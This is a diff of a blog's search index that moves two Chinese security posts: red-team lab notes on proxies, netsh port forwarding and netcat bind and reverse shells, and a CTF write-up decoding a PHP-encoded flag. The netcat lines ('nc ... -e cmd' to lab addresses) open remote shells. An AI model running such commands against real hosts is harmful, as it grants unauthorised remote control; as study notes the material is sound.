@@ -847,89 +847,6 @@
       </tags>
   </entry>
   <entry>
-    <title>【内网渗透学习笔记】04、代理与端口转发</title>
-    <url>/2021/04/05/intranet04/</url>
-    <content><![CDATA[<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理（Proxy）也称为网络代理，是一种特殊的网络服务，允许一个网络终端（客户端）通过这个服务与另一个网络终端（服务器）进行非直接的连接，代理服务有效的保护了网络终端的隐私。</p>
-<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>正向代理即客户端代理，服务器不知道实际发起的客户端。比如<code>vpn</code>,国内不能直接访问谷歌，客户端通过代理服务器可以访问谷歌，客户端将数据转发到代理服务器，再由代理服务器转发给谷歌获取到数据，再返回客户端，这里是代理客户端。</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Client --&gt;<span class="built_in"> Proxy </span>&lt;--&gt; Server</span><br></pre></td></tr></table></figure>
-
-<p>拓扑结构：</p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405104330783.png" alt="image-20210405104330783"></p>
-<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>反向代理即服务器代理，客户端不知道实际提供服务的服务器。比如Windowds远程连接,客户端想要访问服务器的3389端口，可是服务器的3389端口不对外开放，这里通过端口转发，将所有3389端口转发到3333端口，这样客户端访问3333端口就相当于访问了3389端口。这里是代理服务器。</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Client &lt;--&gt;<span class="built_in"> Proxy </span>&lt;-- Server</span><br></pre></td></tr></table></figure>
-
-<p>拓扑结构：</p>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405105139188.png" alt="image-20210405105139188"></p>
-<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><ul>
-<li>基础命令</li>
-</ul>
-<p>使用portproxy模式下的netsh命令即能实现Windows系统中的端口转发，转发命令如下：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>参数含义</li>
-</ul>
-<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># listenaddress		等待连接的本地ip地址</span></span><br><span class="line"><span class="meta"># listenport		本地监听的TCP端口(待转发)</span></span><br><span class="line"><span class="meta"># connectaddress		被转发端口的本地或者远程主机的ip地址</span></span><br><span class="line"><span class="meta"># connectport		被转发的端口</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>添加转发规则 <a>（需要管理员权限）</a></li>
-</ul>
-<blockquote>
-<p>转发前需要确定listenport中指定的本地端口号不被其它服务使用或监听</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">find</span> &quot;<span class="number">3333</span>&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405140242789.png" alt="image-20210405140242789"></p>
-<blockquote>
-<p>或者使用powershell查看</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Test-NetConnection</span> <span class="literal">-ComputerName</span> localhost <span class="literal">-Port</span> <span class="number">3333</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405140430761.png" alt="image-20210405140430761"></p>
-<blockquote>
-<p>添加转发规则</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy <span class="built_in">set</span> v4tov4 listenport=<span class="number">3333</span> listenaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span> connectaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span> connectport=<span class="number">3389</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134229782.png" alt="image-20210405134229782"></p>
-<ul>
-<li>查看转发规则</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>尝试连接</li>
-</ul>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134329342.png" alt="image-20210405134329342"></p>
-<ul>
-<li>删除规则</li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=<span class="number">3333</span> listenaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134600311.png" alt="image-20210405134600311"></p>
-<h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -lp <span class="number">7777</span> -e <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">nc 10.7.6.85 7777</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405135720564.png" alt="image-20210405135720564"></p>
-<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc <span class="number">10.7</span><span class="number">.6</span><span class="number">.177</span> -e cmd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405135848989.png" alt="image-20210405135848989"></p>
-]]></content>
-      <categories>
-        <category>内网学习笔记</category>
-      </categories>
-      <tags>
-        <tag>红队</tag>
-        <tag>学习笔记</tag>
-        <tag>内网渗透</tag>
-        <tag>代理</tag>
-        <tag>端口转发</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【内网渗透学习笔记】05、获取Winodws的远程连接记录</title>
     <url>/2021/04/07/intranet05/</url>
     <content><![CDATA[<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><blockquote>
@@ -1014,6 +931,89 @@
       </tags>
   </entry>
   <entry>
+    <title>【内网渗透学习笔记】04、代理与端口转发</title>
+    <url>/2021/04/05/intranet04/</url>
+    <content><![CDATA[<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理（Proxy）也称为网络代理，是一种特殊的网络服务，允许一个网络终端（客户端）通过这个服务与另一个网络终端（服务器）进行非直接的连接，代理服务有效的保护了网络终端的隐私。</p>
+<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>正向代理即客户端代理，服务器不知道实际发起的客户端。比如<code>vpn</code>,国内不能直接访问谷歌，客户端通过代理服务器可以访问谷歌，客户端将数据转发到代理服务器，再由代理服务器转发给谷歌获取到数据，再返回客户端，这里是代理客户端。</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Client --&gt;<span class="built_in"> Proxy </span>&lt;--&gt; Server</span><br></pre></td></tr></table></figure>
+
+<p>拓扑结构：</p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405104330783.png" alt="image-20210405104330783"></p>
+<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>反向代理即服务器代理，客户端不知道实际提供服务的服务器。比如Windowds远程连接,客户端想要访问服务器的3389端口，可是服务器的3389端口不对外开放，这里通过端口转发，将所有3389端口转发到3333端口，这样客户端访问3333端口就相当于访问了3389端口。这里是代理服务器。</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Client &lt;--&gt;<span class="built_in"> Proxy </span>&lt;-- Server</span><br></pre></td></tr></table></figure>
+
+<p>拓扑结构：</p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405105139188.png" alt="image-20210405105139188"></p>
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><ul>
+<li>基础命令</li>
+</ul>
+<p>使用portproxy模式下的netsh命令即能实现Windows系统中的端口转发，转发命令如下：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>参数含义</li>
+</ul>
+<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># listenaddress		等待连接的本地ip地址</span></span><br><span class="line"><span class="meta"># listenport		本地监听的TCP端口(待转发)</span></span><br><span class="line"><span class="meta"># connectaddress		被转发端口的本地或者远程主机的ip地址</span></span><br><span class="line"><span class="meta"># connectport		被转发的端口</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>添加转发规则 <a>（需要管理员权限）</a></li>
+</ul>
+<blockquote>
+<p>转发前需要确定listenport中指定的本地端口号不被其它服务使用或监听</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">find</span> &quot;<span class="number">3333</span>&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405140242789.png" alt="image-20210405140242789"></p>
+<blockquote>
+<p>或者使用powershell查看</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Test-NetConnection</span> <span class="literal">-ComputerName</span> localhost <span class="literal">-Port</span> <span class="number">3333</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405140430761.png" alt="image-20210405140430761"></p>
+<blockquote>
+<p>添加转发规则</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy <span class="built_in">set</span> v4tov4 listenport=<span class="number">3333</span> listenaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span> connectaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span> connectport=<span class="number">3389</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134229782.png" alt="image-20210405134229782"></p>
+<ul>
+<li>查看转发规则</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>尝试连接</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134329342.png" alt="image-20210405134329342"></p>
+<ul>
+<li>删除规则</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=<span class="number">3333</span> listenaddress=<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">85</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405134600311.png" alt="image-20210405134600311"></p>
+<h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -lp <span class="number">7777</span> -e <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">nc 10.7.6.85 7777</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405135720564.png" alt="image-20210405135720564"></p>
+<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc <span class="number">10.7</span><span class="number">.6</span><span class="number">.177</span> -e cmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210405135848989.png" alt="image-20210405135848989"></p>
+]]></content>
+      <categories>
+        <category>内网学习笔记</category>
+      </categories>
+      <tags>
+        <tag>红队</tag>
+        <tag>学习笔记</tag>
+        <tag>内网渗透</tag>
+        <tag>代理</tag>
+        <tag>端口转发</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>内存取证分析</title>
     <url>/2021/03/05/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h2 id="volatility-工具介绍："><a href="#volatility-工具介绍：" class="headerlink" title="volatility 工具介绍："></a><strong>volatility 工具介绍：</strong></h2><p>Volatility是开源的内存取证工具，在Winodws,Linux,Mac,Android等平台使用，由python编写而成，支持各种操作系统。</p>
@@ -1079,6 +1079,76 @@
       </categories>
       <tags>
         <tag>内存取证</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界-Web2</title>
+    <url>/2020/10/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web2/</url>
+    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
+<li>代码中所用到的函数</li>
+</ul>
+<blockquote>
+<p>strrev — 反转字符串</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024103355812.png" alt="image-20201024103134851"></p>
+<blockquote>
+<p>strlen — 获取字符串长度</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024103134851.png" alt="image-20201024103355812"></p>
+<blockquote>
+<p>substr — 返回字符串的子串</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024103500156.png" alt="image-20201024103238196"></p>
+<blockquote>
+<p>ord — 转换字符串第一个字节为 0-255 之间的值</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024103238196.png" alt="image-20201024103500156"></p>
+<blockquote>
+<p>chr — 返回指定的字符</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024103723312.png" alt="image-20201024103723312"></p>
+<blockquote>
+<p>str_rot13 — 对字符串执行 ROT13 转换</p>
+</blockquote>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024103828672.png" alt="image-20201024103828672"></p>
+<ul>
+<li><p>代码结构分析</p>
+<ul>
+<li><p>对<code>$str</code>字符串进行反转 并且赋值给 <code>$_o</code></p>
+</li>
+<li><p>一个<code>for</code>循环 遍历了变量<code>$_o</code></p>
+<p>依次取变量<code>$_o</code>的第<code>$_0</code>个值并赋值给变量<code>$c</code></p>
+<p>把变量<code>$c</code> 转换为<em>ASCII码</em> + 1 并赋值给变量 <code>$__</code></p>
+<p>再将变量<code>$__</code>转换回字符 并赋值给变量 <code>$c</code></p>
+<p>循环结束将结果拼接起来 并赋值给 变量<code>$_</code></p>
+</li>
+<li><p>按顺序对变量<code>$_</code> base64加密字符串–&gt;strrev反转字符串–&gt;str_rot13加密字符串</p>
+</li>
+</ul>
+</li>
+<li><p>解题思路</p>
+<p>把加密算法逆向算出来就行了</p>
+</li>
+</ul>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$miwen = <span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line">	$str = base64_decode(strrev(str_rot13($miwen)));</span><br><span class="line">	$flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>($a=<span class="number">0</span>;$a&lt;strlen($str);$a++)&#123;</span><br><span class="line">		$b=substr($str,$a,<span class="number">1</span>);</span><br><span class="line">		$o=ord($b)<span class="number">-1</span>;</span><br><span class="line">		$c=chr($o);</span><br><span class="line">		$flag=$flag.$c;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> strrev($flag);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    <img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024111206112.png" alt="image-20201024111206112"></p>
+<p>​      </p>
+<p>​      </p>
+<p>​      </p>
+<p>​      </p>
+<p>​      </p>
+<p>​      </p>
+<p>​      </p>
+<p>​      </p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -1317,76 +1387,6 @@
       </categories>
       <tags>
         <tag>安全杂项</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界-Web2</title>
-    <url>/2020/10/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web2/</url>
-    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
-<li>代码中所用到的函数</li>
-</ul>
-<blockquote>
-<p>strrev — 反转字符串</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024103355812.png" alt="image-20201024103134851"></p>
-<blockquote>
-<p>strlen — 获取字符串长度</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024103134851.png" alt="image-20201024103355812"></p>
-<blockquote>
-<p>substr — 返回字符串的子串</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024103500156.png" alt="image-20201024103238196"></p>
-<blockquote>
-<p>ord — 转换字符串第一个字节为 0-255 之间的值</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024103238196.png" alt="image-20201024103500156"></p>
-<blockquote>
-<p>chr — 返回指定的字符</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024103723312.png" alt="image-20201024103723312"></p>
-<blockquote>
-<p>str_rot13 — 对字符串执行 ROT13 转换</p>
-</blockquote>
-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024103828672.png" alt="image-20201024103828672"></p>
-<ul>
-<li><p>代码结构分析</p>
-<ul>
-<li><p>对<code>$str</code>字符串进行反转 并且赋值给 <code>$_o</code></p>
-</li>
-<li><p>一个<code>for</code>循环 遍历了变量<code>$_o</code></p>
-<p>依次取变量<code>$_o</code>的第<code>$_0</code>个值并赋值给变量<code>$c</code></p>
-<p>把变量<code>$c</code> 转换为<em>ASCII码</em> + 1 并赋值给变量 <code>$__</code></p>
-<p>再将变量<code>$__</code>转换回字符 并赋值给变量 <code>$c</code></p>
-<p>循环结束将结果拼接起来 并赋值给 变量<code>$_</code></p>
-</li>
-<li><p>按顺序对变量<code>$_</code> base64加密字符串–&gt;strrev反转字符串–&gt;str_rot13加密字符串</p>
-</li>
-</ul>
-</li>
-<li><p>解题思路</p>
-<p>把加密算法逆向算出来就行了</p>
-</li>
-</ul>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$miwen = <span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line">	$str = base64_decode(strrev(str_rot13($miwen)));</span><br><span class="line">	$flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>($a=<span class="number">0</span>;$a&lt;strlen($str);$a++)&#123;</span><br><span class="line">		$b=substr($str,$a,<span class="number">1</span>);</span><br><span class="line">		$o=ord($b)<span class="number">-1</span>;</span><br><span class="line">		$c=chr($o);</span><br><span class="line">		$flag=$flag.$c;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> strrev($flag);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>​    <img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20201024111206112.png" alt="image-20201024111206112"></p>
-<p>​      </p>
-<p>​      </p>
-<p>​      </p>
-<p>​      </p>
-<p>​      </p>
-<p>​      </p>
-<p>​      </p>
-<p>​      </p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
